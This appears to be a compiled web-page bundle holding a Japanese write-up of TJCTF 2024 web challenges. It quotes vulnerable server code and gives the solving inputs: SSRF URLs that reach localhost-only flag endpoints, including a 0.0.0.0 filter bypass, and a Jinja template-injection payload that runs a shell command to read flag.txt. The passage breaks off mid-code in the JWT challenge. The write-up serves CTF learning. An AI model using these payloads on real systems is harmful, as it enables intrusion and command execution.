import{d as o,o as u,c as e,a as n,b as s}from"./app.9f256bc5.js";const p="/assets/image.060d2d8a.png",c="/assets/image-1.122f5902.png",l="/assets/image-2.5ffa381a.png",k="/assets/image-3.a5713a96.png",i="/assets/image-4.f01f71aa.png",r="/assets/image-5.f2aabbd4.png",d="/assets/image-6.31dffa86.png",g={class:"markdown-wrapper"},w=n("div",null,[n("h1",{id:"tjctf-2024",tabindex:"-1"},"TJCTF 2024"),n("hr"),n("ul",null,[n("li",null,[n("a",{href:"#%5Bweb%5D-frog"},"[web] frog")]),n("li",null,[n("a",{href:"#%5Bweb%5D-reader"},"[web] reader")]),n("li",null,[n("a",{href:"#%5Bweb%5D-fetcher"},"[web] fetcher")]),n("li",null,[n("a",{href:"#%5Bweb%5D-templater"},"[web] templater")]),n("li",null,[n("a",{href:"#%5Bweb%5D-music-checkout"},"[web] music-checkout")]),n("li",null,[n("a",{href:"#%5Bweb%5D-topplecontainer"},"[web] topplecontainer")]),n("li",null,[n("a",{href:"#%5Bweb%5D-kaboot"},"[web] kaboot")])]),n("hr"),n("h2",{id:"%5Bweb%5D-frog",tabindex:"-1"},"[web] frog"),n("p",null,[n("code",{class:""},"robots.txt"),s("\u3092\u898B\u308B\u3068"),n("code",{class:""},"Disallow: /secret-frogger-78570618/"),s("\u306E\u8A18\u8F09\u304C\u3042\u308B\uFF0E")]),n("p",null,[n("code",{class:""},"/secret-frogger-78570618"),s("\u306B\u3044\u304F\u3068")]),n("pre",{class:"language-html","v-pre":"true"},[n("code",{class:"language-html"},[n("span",{class:"token tag"},[n("span",{class:"token tag"},[n("span",{class:"token punctuation"},"<"),s("a")]),s(),n("span",{class:"token attr-name"},"href"),n("span",{class:"token attr-value"},[n("span",{class:"token punctuation attr-equals"},"="),n("span",{class:"token punctuation"},'"'),s("flag-ed8f2331.txt"),n("span",{class:"token punctuation"},'"')]),s(),n("span",{class:"token special-attr"},[n("span",{class:"token attr-name"},"style"),n("span",{class:"token attr-value"},[n("span",{class:"token punctuation attr-equals"},"="),n("span",{class:"token punctuation"},'"'),n("span",{class:"token value css language-css"},[n("span",{class:"token property"},"text-decoration"),n("span",{class:"token punctuation"},":"),s(" none"),n("span",{class:"token punctuation"},";")]),n("span",{class:"token punctuation"},'"')])]),n("span",{class:"token punctuation"},">")]),s("\u{1F438}"),n("span",{class:"token tag"},[n("span",{class:"token tag"},[n("span",{class:"token punctuation"},"</"),s("a")]),n("span",{class:"token punctuation"},">")]),s(`
`)])]),n("p",null,[s("\u3068\u3042\u308B\u306E\u3067\uFF0C"),n("code",{class:""},"/secret-frogger-78570618/flag-ed8f2331.txt"),s("\u306B\u3044\u304F\u3068flag\u304C\u3042\u3063\u305F\uFF0E")]),n("hr"),n("h2",{id:"%5Bweb%5D-reader",tabindex:"-1"},"[web] reader"),n("p",null,[n("code",{class:""},"site"),s("\u306B\u5165\u529B\u3057\u305Furl\u306E\u5185\u5BB9\u3092\u3068\u3063\u3066\u304D\u3066\u8868\u793A\u3057\u3066\u304F\u308C\u308B\u3063\u307D\u3044\uFF0E")]),n("pre",{class:"language-py","v-pre":"true"},[n("code",{class:"language-py"},[n("span",{class:"token decorator annotation punctuation"},[s("@app"),n("span",{class:"token punctuation"},"."),s("route")]),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"/"'),n("span",{class:"token punctuation"},")"),s(`
`),n("span",{class:"token keyword"},"def"),s(),n("span",{class:"token function"},"index"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},":"),s(`
    `),n("span",{class:"token keyword"},"global"),s(" log"),n("span",{class:"token punctuation"},","),s(` log_count
    site_to_visit `),n("span",{class:"token operator"},"="),s(" request"),n("span",{class:"token punctuation"},"."),s("args"),n("span",{class:"token punctuation"},"."),s("get"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"site"'),n("span",{class:"token punctuation"},")"),s(),n("span",{class:"token keyword"},"or"),s(),n("span",{class:"token string"},'""'),s(`
    url `),n("span",{class:"token operator"},"="),s(" urlparse"),n("span",{class:"token punctuation"},"("),s("site_to_visit"),n("span",{class:"token punctuation"},")"),s(`
    `),n("span",{class:"token keyword"},"if"),s(),n("span",{class:"token keyword"},"not"),s(" site_to_visit"),n("span",{class:"token punctuation"},":"),s(`
        `),n("span",{class:"token keyword"},"return"),s(" render_template"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"index.html"'),n("span",{class:"token punctuation"},")"),s(`
    `),n("span",{class:"token keyword"},"else"),n("span",{class:"token punctuation"},":"),s(`
        parser `),n("span",{class:"token operator"},"="),s(" etree"),n("span",{class:"token punctuation"},"."),s("HTMLParser"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),s(`
        `),n("span",{class:"token keyword"},"try"),n("span",{class:"token punctuation"},":"),s(`
            response `),n("span",{class:"token operator"},"="),s(" get"),n("span",{class:"token punctuation"},"("),s("site_to_visit"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},"."),s(`text
            tree `),n("span",{class:"token operator"},"="),s(" etree"),n("span",{class:"token punctuation"},"."),s("fromstring"),n("span",{class:"token punctuation"},"("),s("response"),n("span",{class:"token punctuation"},","),s(" parser"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},"."),s("getroottree"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),s(`
            content `),n("span",{class:"token operator"},"="),s(" get_text_repr"),n("span",{class:"token punctuation"},"("),s("tree"),n("span",{class:"token punctuation"},","),s(" url"),n("span",{class:"token punctuation"},"."),s("scheme "),n("span",{class:"token operator"},"+"),s(),n("span",{class:"token string"},'"://"'),s(),n("span",{class:"token operator"},"+"),s(" url"),n("span",{class:"token punctuation"},"."),s("netloc"),n("span",{class:"token punctuation"},")"),s(`
        `),n("span",{class:"token keyword"},"except"),s(" Exception "),n("span",{class:"token keyword"},"as"),s(" e"),n("span",{class:"token punctuation"},":"),s(`
            `),n("span",{class:"token keyword"},"print"),n("span",{class:"token punctuation"},"("),s("e"),n("span",{class:"token punctuation"},")"),s(`
            log_count `),n("span",{class:"token operator"},"+="),s(),n("span",{class:"token number"},"1"),s(`
            `),n("span",{class:"token keyword"},"if"),s(" log_count "),n("span",{class:"token operator"},">="),s(" MAX_LOGS"),n("span",{class:"token punctuation"},":"),s(`
                log`),n("span",{class:"token punctuation"},"."),s("pop"),n("span",{class:"token punctuation"},"("),n("span",{class:"token number"},"0"),n("span",{class:"token punctuation"},")"),s(`
                log_count `),n("span",{class:"token operator"},"="),s(` MAX_LOGS
            log`),n("span",{class:"token punctuation"},"."),s("append"),n("span",{class:"token punctuation"},"("),n("span",{class:"token builtin"},"str"),n("span",{class:"token punctuation"},"("),s("e"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),s(`
            tree `),n("span",{class:"token operator"},"="),s(" etree"),n("span",{class:"token punctuation"},"."),s("fromstring"),n("span",{class:"token punctuation"},"("),s(`
                `),n("span",{class:"token string"},'"<body>failed to load page</body>"'),n("span",{class:"token punctuation"},","),s(` parser
            `),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},"."),s("getroottree"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),s(`
            content `),n("span",{class:"token operator"},"="),s(" get_text_repr"),n("span",{class:"token punctuation"},"("),s("tree"),n("span",{class:"token punctuation"},","),s(),n("span",{class:"token string"},'""'),n("span",{class:"token punctuation"},")"),s(`

        `),n("span",{class:"token keyword"},"return"),s(" render_template"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"site_view.html"'),n("span",{class:"token punctuation"},","),s(" content"),n("span",{class:"token operator"},"="),s("content"),n("span",{class:"token punctuation"},")"),s(`
`)])]),n("p",null,[s("\u30D7\u30ED\u30B0\u30E9\u30E0\u3092\u8AAD\u3080\u3068\uFF0C"),n("code",{class:""},"/monitor"),s("\u306B\u3066flag\u306E\u8868\u793A\u3092\u3057\u3066\u304F\u308C\u308B\u304C\uFF0C\u30EA\u30AF\u30A8\u30B9\u30C8\u5143\u306E\u30A2\u30C9\u30EC\u30B9\u304C"),n("code",{class:""},"127.0.0.1"),s("\u304B"),n("code",{class:""},"localhost"),s("\u3067\u306A\u3044\u3068\u30C0\u30E1\u3089\u3057\u3044\uFF0E")]),n("pre",{class:"language-py","v-pre":"true"},[n("code",{class:"language-py"},[n("span",{class:"token decorator annotation punctuation"},[s("@app"),n("span",{class:"token punctuation"},"."),s("route")]),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"/monitor"'),n("span",{class:"token punctuation"},")"),s(`
`),n("span",{class:"token keyword"},"def"),s(),n("span",{class:"token function"},"monitor"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},":"),s(`
    `),n("span",{class:"token keyword"},"if"),s(" request"),n("span",{class:"token punctuation"},"."),s("remote_addr "),n("span",{class:"token keyword"},"in"),s(),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"localhost"'),n("span",{class:"token punctuation"},","),s(),n("span",{class:"token string"},'"127.0.0.1"'),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},":"),s(`
        `),n("span",{class:"token keyword"},"return"),s(" render_template"),n("span",{class:"token punctuation"},"("),s(`
            `),n("span",{class:"token string"},'"admin.html"'),n("span",{class:"token punctuation"},","),s(" message"),n("span",{class:"token operator"},"="),s("flag"),n("span",{class:"token punctuation"},","),s(" errors"),n("span",{class:"token operator"},"="),n("span",{class:"token string"},'""'),n("span",{class:"token punctuation"},"."),s("join"),n("span",{class:"token punctuation"},"("),s("log"),n("span",{class:"token punctuation"},")"),s(),n("span",{class:"token keyword"},"or"),s(),n("span",{class:"token string"},'"No recent errors"'),s(`
        `),n("span",{class:"token punctuation"},")"),s(`
    `),n("span",{class:"token keyword"},"else"),n("span",{class:"token punctuation"},":"),s(`
        `),n("span",{class:"token keyword"},"return"),s(" render_template"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"admin.html"'),n("span",{class:"token punctuation"},","),s(" message"),n("span",{class:"token operator"},"="),n("span",{class:"token string"},'"Unauthorized access"'),n("span",{class:"token punctuation"},","),s(" errors"),n("span",{class:"token operator"},"="),n("span",{class:"token string"},'""'),n("span",{class:"token punctuation"},")"),s(`

`)])]),n("p",null,[n("code",{class:""},"/?site=http://127.0.0.1:5000/monitor"),s("\u3068\u3057\u3066"),n("code",{class:""},"/monitor"),s("\u306E\u5185\u5BB9\u3092\u53D6\u5F97\u3059\u308C\u3070\u3044\u3044")]),n("hr"),n("h2",{id:"%5Bweb%5D-fetcher",tabindex:"-1"},"[web] fetcher"),n("p",null,[n("code",{class:""},"/fetch"),s("\u306B\u5165\u529B\u3057\u305Furl\u306E\u5185\u5BB9\u3092\u3068\u3063\u3066\u304D\u3066\u304F\u308C\u308B\uFF0E "),n("code",{class:""},"/flag"),s("\u306B\u5BFE\u3059\u308B\u30EA\u30AF\u30A8\u30B9\u30C8\u5143\u306E\u30A2\u30C9\u30EC\u30B9\u304C"),n("code",{class:""},"127.0.0.1"),s("\u3067\u3042\u308C\u3070flag\u3092\u5165\u624B\u3067\u304D\u308B\u304C\uFF0C"),n("code",{class:""},"/fetch"),s("\u3067\u306Furl\u304C"),n("code",{class:""},"localhost"),s("\u3084"),n("code",{class:""},"127.0.0.1"),s("\u306E\u6587\u5B57\u5217\u3092\u542B\u3093\u3067\u3044\u305F\u3089\u5F37\u5236\u7D42\u4E86\u3059\u308B\u3088\u3046\u306B\u306A\u3063\u3066\u3044\u305F\uFF0E")]),n("pre",{class:"language-js","v-pre":"true"},[n("code",{class:"language-js"},[s("app"),n("span",{class:"token punctuation"},"."),n("span",{class:"token function"},"post"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},"'/fetch'"),n("span",{class:"token punctuation"},","),s(),n("span",{class:"token keyword"},"async"),s(),n("span",{class:"token punctuation"},"("),n("span",{class:"token parameter"},[s("req"),n("span",{class:"token punctuation"},","),s(" res")]),n("span",{class:"token punctuation"},")"),s(),n("span",{class:"token operator"},"=>"),s(),n("span",{class:"token punctuation"},"{"),s(`
  `),n("span",{class:"token keyword"},"const"),s(" url "),n("span",{class:"token operator"},"="),s(" req"),n("span",{class:"token punctuation"},"."),s("body"),n("span",{class:"token punctuation"},"."),s(`url

  `),n("span",{class:"token keyword"},"if"),s(),n("span",{class:"token punctuation"},"("),n("span",{class:"token operator"},"!"),n("span",{class:"token regex"},[n("span",{class:"token regex-delimiter"},"/"),n("span",{class:"token regex-source language-regex"},"^https?:\\/\\/"),n("span",{class:"token regex-delimiter"},"/")]),n("span",{class:"token punctuation"},"."),n("span",{class:"token function"},"test"),n("span",{class:"token punctuation"},"("),s("url"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),s(),n("span",{class:"token keyword"},"return"),s(" res"),n("span",{class:"token punctuation"},"."),n("span",{class:"token function"},"send"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},"'invalid url'"),n("span",{class:"token punctuation"},")"),s(`

  `),n("span",{class:"token keyword"},"try"),s(),n("span",{class:"token punctuation"},"{"),s(`
    `),n("span",{class:"token keyword"},"const"),s(" checkURL "),n("span",{class:"token operator"},"="),s(),n("span",{class:"token keyword"},"new"),s(),n("span",{class:"token class-name"},"URL"),n("span",{class:"token punctuation"},"("),s("url"),n("span",{class:"token punctuation"},")"),s(`

    `),n("span",{class:"token keyword"},"if"),s(),n("span",{class:"token punctuation"},"("),s(`
      checkURL`),n("span",{class:"token punctuation"},"."),s("host"),n("span",{class:"token punctuation"},"."),n("span",{class:"token function"},"includes"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},"'localhost'"),n("span",{class:"token punctuation"},")"),s(),n("span",{class:"token operator"},"||"),s(`
      checkURL`),n("span",{class:"token punctuation"},"."),s("host"),n("span",{class:"token punctuation"},"."),n("span",{class:"token function"},"includes"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},"'127.0.0.1'"),n("span",{class:"token punctuation"},")"),s(`
    `),n("span",{class:"token punctuation"},")"),s(`
      `),n("span",{class:"token keyword"},"return"),s(" res"),n("span",{class:"token punctuation"},"."),n("span",{class:"token function"},"send"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},"'invalid url'"),n("span",{class:"token punctuation"},")"),s(`
  `),n("span",{class:"token punctuation"},"}"),s(),n("span",{class:"token keyword"},"catch"),s(),n("span",{class:"token punctuation"},"("),s("e"),n("span",{class:"token punctuation"},")"),s(),n("span",{class:"token punctuation"},"{"),s(`
    `),n("span",{class:"token keyword"},"return"),s(" res"),n("span",{class:"token punctuation"},"."),n("span",{class:"token function"},"send"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},"'invalid url'"),n("span",{class:"token punctuation"},")"),s(`
  `),n("span",{class:"token punctuation"},"}"),s(`

  `),n("span",{class:"token keyword"},"const"),s(" r "),n("span",{class:"token operator"},"="),s(),n("span",{class:"token keyword"},"await"),s(),n("span",{class:"token function"},"fetch"),n("span",{class:"token punctuation"},"("),s("url"),n("span",{class:"token punctuation"},","),s(),n("span",{class:"token punctuation"},"{"),s(),n("span",{class:"token literal-property property"},"redirect"),n("span",{class:"token operator"},":"),s(),n("span",{class:"token string"},"'manual'"),s(),n("span",{class:"token punctuation"},"}"),n("span",{class:"token punctuation"},")"),s(`

  `),n("span",{class:"token keyword"},"const"),s(" fetched "),n("span",{class:"token operator"},"="),s(),n("span",{class:"token keyword"},"await"),s(" r"),n("span",{class:"token punctuation"},"."),n("span",{class:"token function"},"text"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),s(`

  res`),n("span",{class:"token punctuation"},"."),n("span",{class:"token function"},"send"),n("span",{class:"token punctuation"},"("),s("fetched"),n("span",{class:"token punctuation"},")"),s(`
`),n("span",{class:"token punctuation"},"}"),n("span",{class:"token punctuation"},")"),s(`
`)])]),n("pre",{class:"language-js","v-pre":"true"},[n("code",{class:"language-js"},[s("app"),n("span",{class:"token punctuation"},"."),n("span",{class:"token function"},"get"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},"'/flag'"),n("span",{class:"token punctuation"},","),s(),n("span",{class:"token punctuation"},"("),n("span",{class:"token parameter"},[s("req"),n("span",{class:"token punctuation"},","),s(" res")]),n("span",{class:"token punctuation"},")"),s(),n("span",{class:"token operator"},"=>"),s(),n("span",{class:"token punctuation"},"{"),s(`
  `),n("span",{class:"token keyword"},"if"),s(),n("span",{class:"token punctuation"},"("),s(`
    req`),n("span",{class:"token punctuation"},"."),s("ip "),n("span",{class:"token operator"},"!=="),s(),n("span",{class:"token string"},"'::ffff:127.0.0.1'"),s(),n("span",{class:"token operator"},"&&"),s(`
    req`),n("span",{class:"token punctuation"},"."),s("ip "),n("span",{class:"token operator"},"!=="),s(),n("span",{class:"token string"},"'::1'"),s(),n("span",{class:"token operator"},"&&"),s(`
    req`),n("span",{class:"token punctuation"},"."),s("ip "),n("span",{class:"token operator"},"!=="),s(),n("span",{class:"token string"},"'127.0.0.1'"),s(`
  `),n("span",{class:"token punctuation"},")"),s(`
    `),n("span",{class:"token keyword"},"return"),s(" res"),n("span",{class:"token punctuation"},"."),n("span",{class:"token function"},"send"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},"'bad ip'"),n("span",{class:"token punctuation"},")"),s(`

  res`),n("span",{class:"token punctuation"},"."),n("span",{class:"token function"},"send"),n("span",{class:"token punctuation"},"("),n("span",{class:"token template-string"},[n("span",{class:"token template-punctuation string"},"`"),n("span",{class:"token string"},"hey myself! here's your flag: "),n("span",{class:"token interpolation"},[n("span",{class:"token interpolation-punctuation punctuation"},"${"),s("flag"),n("span",{class:"token interpolation-punctuation punctuation"},"}")]),n("span",{class:"token template-punctuation string"},"`")]),n("span",{class:"token punctuation"},")"),s(`
`),n("span",{class:"token punctuation"},"}"),n("span",{class:"token punctuation"},")"),s(`
`)])]),n("p",null,[n("a",{href:"https://book.hacktricks.xyz/v/jp/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass"},"url-format-bypass"),s(" \u3092\u53C2\u8003\u306B"),n("code",{class:""},"http://0.0.0.0"),s("\u3092fetch\u3055\u305B\u308B\u3053\u3068\u3067\u901A\u3063\u305F\uFF0E")]),n("hr"),n("h2",{id:"%5Bweb%5D-templater",tabindex:"-1"},"[web] templater"),n("p",null,[n("img",{src:p,alt:"alt text"}),s(" \u5165\u529B\u3055\u308C\u305F\u6587\u7AE0\u306E\u4E2D\u304B\u3089"),n("code",{class:""},"{{key}}"),s("\u3068\u3044\u3046\u6587\u5B57\u5217\u3092\u63A2\u3057\u3060\u3057\uFF0Ckey\u306B\u5BFE\u5FDC\u3059\u308Bvalue\u306B\u66F8\u304D\u63DB\u3048\u3066\u304F\u308C\u308B\u30D7\u30ED\u30B0\u30E9\u30E0\u306B\u306A\u3063\u3066\u3044\u308B\uFF0E "),n("code",{class:""},"key"),s("\u304C\u5B58\u5728\u3057\u306A\u3044\u5834\u5408\u306F"),n("code",{class:""},"key not found"),s("\u306E\u3088\u3046\u306B\u51FA\u529B\u3092\u3057\u3066\u304F\u308C\u3066\uFF0C"),n("code",{class:""},"key:flag"),s("\u306F"),n("code",{class:""},"value:tjctf{...}"),s(" \u3092\u6301\u3064\uFF0E \u30EC\u30B9\u30DD\u30F3\u30B9\u306E\u6587\u7AE0\u306E\u4E2D\u306B\u7B54\u3048\u306Eflag\u304C\u5165\u3063\u3066\u3044\u305F\u3089flag\u3092\u96A0\u3059\u4ED5\u69D8\u306B\u306A\u3063\u3066\u3044\u308B\uFF0E")]),n("p",null,[s("flag\u306E\u30D5\u30A9\u30FC\u30DE\u30C3\u30C8\u304C"),n("code",{class:""},"tjctf{...}"),s("\u3067\u3042\u308B\u3053\u3068\u304B\u3089\uFF0C"),n("code",{class:""},"{{{{flag}}}"),s("\u306E\u3088\u3046\u306B\u5165\u529B\u3059\u308B\u3053\u3068\u3067\uFF0C")]),n("pre",{class:"language-txt","v-pre":"true"},[n("code",{class:"language-txt"},`{{{{flag}}}\u2192{{tjctf{...}}
`)]),n("p",null,[s("\u3068\u306A\u308B\uFF0E"),n("code",{class:""},"tjctf{..."),s("\u306B\u5BFE\u5FDC\u3059\u308B\u6587\u5B57\u5217\u3092\u51FA\u529B\u3059\u308B\u5FC5\u8981\u304C\u3042\u308B\u304C\uFF0C"),n("code",{class:""},"tjctf{..."),s("\u306A\u308Bkey\u306F\u7528\u610F\u3057\u3066\u3044\u306A\u3044\uFF0Eerror\u6587\u306B\u6700\u5F8C\u306E"),n("code",{class:""},"}"),s("\u3092\u629C\u3044\u305Fflag\u304C\u51FA\u529B\u3055\u308C\u308B\uFF0E "),n("img",{src:c,alt:"alt text"})]),n("hr"),n("h2",{id:"%5Bweb%5D-music-checkout",tabindex:"-1"},"[web] music-checkout"),n("p",null,[n("img",{src:l,alt:"alt text"})]),n("p",null,"\u8272\u3005\u5165\u529B\u304C\u3067\u304D\u308B\u3063\u307D\u3044"),n("p",null,[n("img",{src:k,alt:"alt text"})]),n("p",null,"\u30B3\u30FC\u30C9\u3092\u8AAD\u3080\u3068\uFF0Ctext\u3067\u306FSSTI\u5BFE\u7B56\u304C\u3055\u308C\u3066\u3044\u308B\u304Cusername\u3067\u306F\u3055\u308C\u3066\u3044\u306A\u3044\u3053\u3068\u304C\u308F\u304B\u308B\uFF0E"),n("pre",{class:"language-py","v-pre":"true"},[n("code",{class:"language-py"},[n("span",{class:"token decorator annotation punctuation"},[s("@app"),n("span",{class:"token punctuation"},"."),s("route")]),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"/create_playlist"'),n("span",{class:"token punctuation"},","),s(" methods"),n("span",{class:"token operator"},"="),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},'"POST"'),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},")"),s(`
`),n("span",{class:"token keyword"},"def"),s(),n("span",{class:"token function"},"post_playlist"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},":"),s(`
    `),n("span",{class:"token keyword"},"try"),n("span",{class:"token punctuation"},":"),s(`
        username `),n("span",{class:"token operator"},"="),s(" request"),n("span",{class:"token punctuation"},"."),s("form"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},'"username"'),n("span",{class:"token punctuation"},"]"),s(`
        text `),n("span",{class:"token operator"},"="),s(" request"),n("span",{class:"token punctuation"},"."),s("form"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},'"text"'),n("span",{class:"token punctuation"},"]"),s(`
        `),n("span",{class:"token keyword"},"if"),s(),n("span",{class:"token builtin"},"len"),n("span",{class:"token punctuation"},"("),s("text"),n("span",{class:"token punctuation"},")"),s(),n("span",{class:"token operator"},">"),s(),n("span",{class:"token number"},"10_000"),n("span",{class:"token punctuation"},":"),s(`
            `),n("span",{class:"token keyword"},"return"),s(),n("span",{class:"token string"},'"Too much!"'),n("span",{class:"token punctuation"},","),s(),n("span",{class:"token number"},"406"),s(`
        `),n("span",{class:"token keyword"},"if"),s(),n("span",{class:"token string"},'"{{"'),s(),n("span",{class:"token keyword"},"in"),s(" text "),n("span",{class:"token keyword"},"or"),s(),n("span",{class:"token string"},'"}}"'),s(),n("span",{class:"token keyword"},"in"),s(" text"),n("span",{class:"token punctuation"},":"),s(`
            `),n("span",{class:"token keyword"},"return"),s(),n("span",{class:"token string"},'"Nice try!"'),n("span",{class:"token punctuation"},","),s(),n("span",{class:"token number"},"406"),s(`
        text `),n("span",{class:"token operator"},"="),s(),n("span",{class:"token punctuation"},"["),s("line"),n("span",{class:"token punctuation"},"."),s("split"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'","'),n("span",{class:"token punctuation"},")"),s(),n("span",{class:"token keyword"},"for"),s(" line "),n("span",{class:"token keyword"},"in"),s(" text"),n("span",{class:"token punctuation"},"."),s("splitlines"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},"]"),s(`
        text `),n("span",{class:"token operator"},"="),s(),n("span",{class:"token punctuation"},"["),s("line"),n("span",{class:"token punctuation"},"["),n("span",{class:"token punctuation"},":"),n("span",{class:"token number"},"4"),n("span",{class:"token punctuation"},"]"),s(),n("span",{class:"token operator"},"+"),s(),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},'"?"'),n("span",{class:"token punctuation"},"]"),s(),n("span",{class:"token operator"},"*"),s(),n("span",{class:"token punctuation"},"("),n("span",{class:"token number"},"4"),s(),n("span",{class:"token operator"},"-"),s(),n("span",{class:"token builtin"},"min"),n("span",{class:"token punctuation"},"("),n("span",{class:"token builtin"},"len"),n("span",{class:"token punctuation"},"("),s("line"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},","),s(),n("span",{class:"token number"},"4"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),s(),n("span",{class:"token keyword"},"for"),s(" line "),n("span",{class:"token keyword"},"in"),s(" text"),n("span",{class:"token punctuation"},"]"),s(`
        filled `),n("span",{class:"token operator"},"="),s(" render_template"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"playlist.html"'),n("span",{class:"token punctuation"},","),s(" username"),n("span",{class:"token operator"},"="),s("username"),n("span",{class:"token punctuation"},","),s(" songs"),n("span",{class:"token operator"},"="),s("text"),n("span",{class:"token punctuation"},")"),s(`
        this_id `),n("span",{class:"token operator"},"="),s(),n("span",{class:"token builtin"},"str"),n("span",{class:"token punctuation"},"("),s("uuid"),n("span",{class:"token punctuation"},"."),s("uuid4"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),s(`
        `),n("span",{class:"token keyword"},"with"),s(),n("span",{class:"token builtin"},"open"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string-interpolation"},[n("span",{class:"token string"},'f"templates/uploads/'),n("span",{class:"token interpolation"},[n("span",{class:"token punctuation"},"{"),s("this_id"),n("span",{class:"token punctuation"},"}")]),n("span",{class:"token string"},'.html"')]),n("span",{class:"token punctuation"},","),s(),n("span",{class:"token string"},'"w"'),n("span",{class:"token punctuation"},")"),s(),n("span",{class:"token keyword"},"as"),s(" f"),n("span",{class:"token punctuation"},":"),s(`
            f`),n("span",{class:"token punctuation"},"."),s("write"),n("span",{class:"token punctuation"},"("),s("filled"),n("span",{class:"token punctuation"},")"),s(`
        `),n("span",{class:"token keyword"},"return"),s(" render_template"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"created_playlist.html"'),n("span",{class:"token punctuation"},","),s(" uuid_val"),n("span",{class:"token operator"},"="),s("this_id"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},","),s(),n("span",{class:"token number"},"200"),s(`
    `),n("span",{class:"token keyword"},"except"),s(" Exception "),n("span",{class:"token keyword"},"as"),s(" e"),n("span",{class:"token punctuation"},":"),s(`
        `),n("span",{class:"token keyword"},"print"),n("span",{class:"token punctuation"},"("),s("e"),n("span",{class:"token punctuation"},")"),s(`
        `),n("span",{class:"token keyword"},"return"),s(),n("span",{class:"token string"},'"Internal server error"'),n("span",{class:"token punctuation"},","),s(),n("span",{class:"token number"},"500"),s(`
`)])]),n("p",null,[n("code",{class:""},'{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("cat flag.txt").read() }}'),s("\u3092username\u306B\u5165\u529B\u3059\u308C\u3070flag\u304C\u51FA\u529B\u3055\u308C\u308B\uFF0E")]),n("p",null,[n("img",{src:i,alt:"alt text"})]),n("hr"),n("h2",{id:"%5Bweb%5D-topplecontainer",tabindex:"-1"},"[web] topplecontainer"),n("p",null,"\u4E0E\u3048\u3089\u308C\u305F\u30B5\u30A4\u30C8\u306B\u884C\u304F\u3068\uFF0C\u30D5\u30A1\u30A4\u30EB\u306E\u30A2\u30C3\u30D7\u30ED\u30FC\u30C9\u30DA\u30FC\u30B8\u304C\u4E0E\u3048\u3089\u308C\u308B\uFF0E \u8A8D\u8A3C\u306Fjwt\u3067\u884C\u308F\u308C\u3066\u3044\u308B\uFF0E"),n("p",null,[n("img",{src:r,alt:"alt text"})]),n("p",null,[s("\u30B3\u30FC\u30C9\u3092\u8AAD\u3080\u3068\uFF0C"),n("code",{class:""},"/flag"),s("\u306B\u30A2\u30AF\u30BB\u30B9\u3057\u305F\u969B\u306Bjwt\u306Eid\u304Cadmin\u3067\u3042\u308B\u3068\u304D\u306Bflag\u3092\u8FD4\u3059\u3088\u3046\u306B\u306A\u3063\u3066\u3044\u308B\uFF0E jwt\u306E\u8A8D\u8A3C\u3067\u306F\uFF0C\u30D8\u30C3\u30C0\u30FC\u306Ejku\u306B\u66F8\u304B\u308C\u305Fjson\u30D5\u30A1\u30A4\u30EB\u304B\u3089\u516C\u958B\u9375\u3092\u53D6\u5F97\u3057\uFF0C\u305D\u306E\u9375\u3067jwt\u306E\u7F72\u540D\u3092\u78BA\u8A8D\u3059\u308B\u3068\u3044\u3046\u3088\u3046\u306B\u306A\u3063\u3066\u3044\u308B\uFF0E")]),n("pre",{class:"language-py","v-pre":"true"},[n("code",{class:"language-py"},[n("span",{class:"token keyword"},"def"),s(),n("span",{class:"token function"},"login_required"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},":"),s(`
    `),n("span",{class:"token keyword"},"def"),s(),n("span",{class:"token function"},"_login_required"),n("span",{class:"token punctuation"},"("),s("f"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},":"),s(`
